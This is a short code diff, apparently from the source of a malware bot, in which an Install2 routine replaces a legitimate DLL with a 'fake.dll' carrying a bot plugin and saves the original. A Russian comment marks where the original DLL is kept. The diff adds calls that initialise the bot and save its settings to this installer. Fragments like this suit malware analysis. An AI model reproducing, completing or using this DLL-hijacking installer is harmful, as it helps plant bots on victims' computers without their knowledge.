@@ -613,6 +613,7 @@ extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
 	BOOL ret = FALSE;
+	BOT::Initialize();
 	if( !File::IsExists((char*)fakeDll) ) return FALSE;
 	char origDll[MAX_PATH]; //путь куда сохраняется оригинальная длл
 	m_lstrcpy( origDll, fakeDll );
@@ -665,6 +666,7 @@ extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD s
 			if( File::WriteBufferA( fakeDll2, fakeDllBody2, fakeDllSize ) == fakeDllSize )
 			{
 				FAKEDLLDBG( "InstallFakeDll", "fake.dll installed" );
+				BOT::SaveSettings(true, false, false);
 				ret = TRUE;
 			}
 		}
